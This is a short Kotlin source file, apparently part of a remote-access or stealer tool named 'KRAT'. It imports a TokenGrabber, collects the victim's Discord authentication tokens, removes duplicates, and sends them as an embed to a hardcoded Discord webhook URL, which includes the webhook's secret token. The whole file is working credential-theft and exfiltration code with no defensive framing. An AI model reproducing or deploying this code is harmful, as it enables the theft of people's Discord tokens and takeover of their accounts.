package services

import KRAT.user
import services.discord.TokenGrabber.getTokens
import utils.DiscordWebhook
import utils.ListUtils.removeDuplicates

object Discord {
    fun webhook(): DiscordWebhook {
        return DiscordWebhook("https://discord.com/api/webhooks/1289937157145886800/dz8f1OAp8FczOWgGUe78fJSxi4Ogv3XySkoemeiaWazv680BUYWDDng83Ob7N_yGigJJ").apply {
            username = user
        }
    }

    fun sendTokens() {
        val tokens = getTokens()?.removeDuplicates()
        if (tokens == null || tokens.isEmpty()) return

        webhook().apply {
            embeds.add(
                DiscordWebhook.EmbedObject()
                    .setTitle("Discord token detected")
                    .setDescription("**Tokens:** ${tokens.map { "```$it```" }.joinToString()}")
            )
            execute()
        }
    }
}